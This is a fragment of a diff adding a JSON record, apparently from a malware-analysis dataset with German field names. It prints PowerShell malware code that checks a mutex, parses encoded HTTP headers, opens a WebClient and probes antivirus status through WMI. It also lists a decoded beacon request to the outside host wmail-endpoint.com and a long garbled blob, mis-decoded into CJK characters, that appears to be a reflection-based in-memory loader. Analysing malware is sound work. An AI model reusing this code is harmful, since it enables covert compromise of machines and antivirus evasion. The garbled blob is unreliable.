\"6626b3d5-9306-45cb-91ca-3e86a88840e2\", [ref]$createdNew);\r\nif ($createdNew -eq $false) {\r\n    Start-Sleep -Seconds 720;\r\n    return;\r\n}\r\n\r\n$_headers = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($meta_request)) -split \"rn\";\r\n$http_request = @{}; \r\n$http_headers = @{};\r\n\r\n$_requestline = $_headers[0] -split ' ';\r\n$http_request.path = $_requestline[1].Replace('%7b', '{').Replace('%7d', '}');\r\n\r\nfor ($i = 1; $i -lt $_headers.Length; $i++) {\r\n    [string[]]$h = $_headers[$i] -split ': ';\r\n    if ($h.Length -lt 2) {\r\n        break;\r\n    }\r\n    $http_headers[$h[0]] = $h[1];\r\n}\r\n\r\n$user_auth = @{\r\n    id = -1;\r\n};\r\n\r\n$client = New-Object 'System.Net.WebClient'\r\n\r\nfunction WMI {\r\n    param (\r\n        $namespace,\r\n        $class\r\n    )\r\n    try {\r\n        return Get-WmiObject -Namespace $namespace -Class $class;\r\n    }\r\n    catch {\r\n    }\r\n    return $null;\r\n}\r\n\r\nfunction Get-AvStatus {\r\n    param (\r\n        $av\r\n    )\r\n    $status = \"Unknown\";\r\n    try {\r\n        $v = [uint32]::Parse($av.productState) -band 0xF000;\r\n        switch ($v) {\r\n            0x0000 { $status = \"Disabled\" }\r\n            0x1000 { $status = \"En",
+    "dekodierte_befehle": [
+      "get /v2/0f3a54ec-4191-4feb-9791-82f91277498e?v=ver%5f2 http/1.1\r\nhost: wmail-endpoint.com\r\nconnection: keep-alive\r\npragma: no-cache\r\ncache-control: no-cache\r\nupgrade-insecure-requests: 1\r\nuser-agent: mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/76.0.3809.71 safari/537.36\r\naccept-language: en-us,en;q=0.9\r\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\naccept-encoding: gzip, deflate",
+      "卛獹整⹭湅楶潲浮湥嵴㨺畃牲湥䑴物捥潴祲㴠␠坐⹄慐桴഻䄊摤吭灹⁥倭瑡⁨␢湥㩶楷摮物䵜捩潲潳瑦丮呅䙜慲敭潷歲㐶癜⸴⸰〳ㄳ尹祓瑳浥刮湵楴敭搮汬㬢਍摁ⵤ祔数ⴠ慐桴∠攤癮眺湩楤屲楍牣獯景⹴䕎屔牆浡睥牯㙫尴㑶〮㌮㌰㤱卜獹整⹭畒瑮浩⹥湉整潲印牥楶散⹳汤≬഻ഊ␊牣慥整乤睥㴠␠牴敵഻␊畭整乸浡⁥‽䍛湯敶瑲㩝吺䉯獡㙥匴牴湩⡧卛獹整⹭敓畣楲祴䌮祲瑰杯慲桰⹹䡓㉁㘵㩝䌺敲瑡⡥⸩潃灭瑵䡥獡⡨呛硥⹴湅潣楤杮㩝唺䙔⸸敇䉴瑹獥∨㔴㔹␱␨湥㩶佃偍呕剅䅎䕍ㄩ㠲㔸⠤攤癮唺䕓乒䵁⥅㌲㤴⤢⤩഻␊畭整⁸‽卛獹整⹭桔敲摡湩⹧畍整嵸㨺敮⡷琤畲ⱥ␠畭整乸浡ⱥ嬠敲嵦挤敲瑡摥敎⥷഻椊⁦␨牣慥整乤睥ⴠ煥␠慦獬⥥笠਍††敲畴湲഻紊਍਍愤獳浥汢敩⁳‽敎⵷扏敪瑣ⴠ祔数慎敭匠獹整⹭潃汬捥楴湯⹳敇敮楲⹣楄瑣潩慮祲嬧瑳楲杮‬祓瑳浥刮晥敬瑣潩⹮獁敳扭祬❝ⴠ牁畧敭瑮楌瑳⠠卛牴湩䍧浯慰敲嵲㨺牏楤慮䥬湧牯䍥獡⥥਍潦敲捡⁨␨獡敳扭祬椠⁮嬨灁䑰浯楡嵮㨺畃牲湥䑴浯楡⹮敇䅴獳浥汢敩⡳⤩ ൻ †␠獡敳扭楬獥孛祓瑳浥䤮⹏慐桴㩝䜺瑥楆敬慎敭␨獡敳扭祬䰮捯瑡潩⥮⁝‽愤獳浥汢㭹਍ൽഊ昊湵瑣潩⁮敇⵴湕慳敦畆据楴湯笠਍††慰慲⁭ന †††嬠瑳楲杮൝ †††␠潭畤敬ബ †††嬠瑳楲杮൝ †††␠慮敭ബ †††嬠祴数嵛൝ †††␠慰慲獭ബ †††嬠祴数൝ †††␠敲瑴灹൥ †⤠਍††渤⁡‽愤獳浥汢敩孳匧獹整⹭汤❬⹝敇呴灹⡥✨楍牣獯景❴⬠✠圮湩㈳✮⬠✠湕慳敦❎⬠✠瑡癩䵥瑥潨獤⤧㬩਍††朤⁰‽渤⹡敇䵴瑥潨⡤䜧瑥牐捯摁牤獥❳‬呛灹孥嵝䀠✨祓瑳浥刮湵楴敭䤮瑮牥灯敓癲捩獥䠮湡汤剥晥Ⱗ✠瑳楲杮⤧㬩਍††洤⁤‽渤⹡敇䵴瑥潨⡤䜧瑥潍畤敬慈摮敬⤧䤮癮歯⡥渤汵ⱬ䀠␨潭畤敬⤩഻ †␠瑰⁲‽朤⹰湉潶敫␨畮汬‬⡀嬨祓瑳浥刮湵楴敭䤮瑮牥灯敓癲捩獥䠮湡汤剥晥㩝渺睥嬨扯敪瑣㩝渺睥⤨‬洤⥤Ⱙ␠慮敭⤩഻ †␠畢㴠嬠灁䑰浯楡嵮㨺畃牲湥䑴浯楡⹮敄楦敮祄慮業䅣獳浥汢⡹卛獹整⹭敒汦捥楴湯䄮獳浥汢乹浡嵥㨺敮⡷✨❟⬠嬠畧摩㩝为睥畇摩⤨吮卯牴湩⡧⤩Ⱙ嬠祓瑳浥刮晥敬瑣潩⹮浅瑩䄮獳浥汢䉹極摬牥捁散獳㩝刺湵⸩敄楦敮祄慮業䵣摯汵⡥✨❟⬠嬠畧摩㩝为睥畇摩⤨吮卯牴湩⡧⤩‬昤污敳⸩敄楦敮祔数⠨弧‧‫杛極嵤㨺敎䝷極⡤⸩潔瑓楲杮⤨Ⱙ✠汃獡ⱳ倠扵楬Ᵽ匠慥敬Ɽ䄠獮䍩慬獳‬畁潴汃獡❳‬卛獹整⹭畍瑬捩獡䑴汥来瑡嵥㬩਍††戤⹵敄楦敮潃獮牴捵潴⡲刧協数楣污慎敭‬楈敤祂楓Ⱨ倠扵楬❣‬卛獹整⹭敒汦捥楴湯䌮污楬杮潃癮湥楴湯嵳㨺瑓湡慤摲‬瀤牡浡⥳匮瑥浉汰"
+    ],
+    "beobachtete_abfolge": [
+      "Base64-Inhalt dekodieren"
+    ]
+  }
+}
